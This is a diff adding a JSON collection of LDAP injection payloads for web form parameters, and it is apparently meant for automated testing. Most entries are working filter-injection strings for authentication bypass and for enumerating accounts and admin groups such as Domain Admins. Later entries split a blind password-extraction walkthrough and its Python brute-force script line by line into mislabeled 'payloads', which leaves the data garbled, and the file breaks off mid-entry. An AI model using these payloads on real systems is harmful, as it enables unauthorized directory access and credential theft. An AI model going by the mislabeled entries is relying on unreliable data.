@@ -1,0 +1,1355 @@
+[
+  {
+    "payload_id": "OWP-0619",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0620",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(&",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0621",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*))%00",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0622",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": ")(cn=))\\x00",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0623",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*()|&'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0624",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*()|&'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0625",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*(|(mail=*))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0626",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*(|(objectclass=*))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0627",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(uid=*))(|(uid=*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0628",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "admin*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0629",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "admin*)((|userpassword=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0630",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "admin*)((|userPassword=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0631",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "x' or name()='username' or 'x'='y",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0632",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "%21",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0633",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "%26",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0634",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "%28",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0635",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "%29",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0636",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "%2A%28%7C%28mail%3D%2A%29%29",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0637",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "%2A%28%7C%28objectclass%3D%2A%29%29",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0638",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "&",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0639",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "(",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0640",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": ")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0641",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "admin*))(|(uid=*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0642",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*))(|(password=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0643",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "admin*)(memberOf=cn=admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0644",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0645",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*))(|(userPassword=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0646",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(uid=*)))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0647",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(uid=admin*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0648",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*))(|(description=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0649",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(uid=*)(password=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0650",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "admin*(|)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0651",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*))(|(mail=*@*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0652",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(sAMAccountName=*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0653",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(title=*))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0654",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(objectClass=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0655",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(sn=*))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0656",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(givenName=*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0657",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(memberOf=CN=Domain Admins*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0658",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(adminCount=1*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0659",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(uid=admin)(uid=root))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0660",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(!(uid=*))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0661",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(&(uid=*)(password=*))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0662",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*))(|(uid=admin))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0663",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(userPassword=*))(&(cn=*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1664",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(uid=root))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1665",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(cn=root))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1666",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(sn=admin))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1667",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(cn=Administrator))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1668",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(|(description=admin))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1669",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(&(uid=*)(cn=admin))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1670",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(&(objectClass=user)(uid=*))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1671",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(&(objectClass=person)(cn=*))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1672",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(uid=123456)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1673",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(employeeID=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1674",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(telephoneNumber=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1675",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(mail=*@domain.com)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1676",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(userPrincipalName=*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1677",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(sAMAccountName=Administrator)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1678",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(memberOf=CN=Enterprise Admins*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1679",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(memberOf=CN=Schema Admins*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1680",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(memberOf=CN=Domain Controllers*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1681",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)(memberOf=CN=Exchange*)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1682",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)((uid=admin))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-1683",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "LDAP",
+    "injection_point": "form_parameter",
+    "payload_string": "*)((cn=admin))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37714",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "user  = *)(uid=*))(|(uid=*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37715",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "pass  = password",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37716",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37717",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "user  = admin)(!(&(1=0",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37718",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "pass  = q))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37719",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "query = (&(uid=admin)(!(&(1=0)(userPassword=q))))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37720",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=*))    : OK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37721",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=A*))   : KO",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37722",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=B*))   : KO",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37723",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=M*))   : OK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37724",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=MA*))  : KO",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37725",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=MB*))  : KO",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37726",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=MY*))  : OK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37727",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=MYA*)) : KO",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37728",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=MYB*)) : KO",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37729",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=MYC*)) : KO",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37730",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=MYK*)) : OK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37731",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(&(sn=administrator)(password=MYKE)) : OK",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37732",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "userPassword",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37733",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "surname",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37734",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "cn",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37735",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "sn",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37736",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "objectClass",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37737",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "givenName",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37738",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "commonName",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37739",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "userPassword:2.5.13.18:=\\xx (\\xx is a byte)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37740",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "userPassword:2.5.13.18:=\\xx\\xx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37741",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "userPassword:2.5.13.18:=\\xx\\xx\\xx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37742",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "fields = []",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37743",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "url = 'https://URL.com/'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37744",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "f = open('dic', 'r')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37745",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "world = f.read().split('\\n')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37746",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "f.close()",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37747",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "for i in world:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37748",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\\x00)(password=bla))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37749",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "if 'TRUE CONDITION' in r.text:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37750",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "fields.append(str(i))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37751",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "print(fields)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37752",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "import requests, string",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37753",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "alphabet = string.ascii_letters + string.digits + \"_@{}-/()!\\\"$%=^[]:;\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37754",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "flag = \"\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37755",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "for i in range(50):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37756",
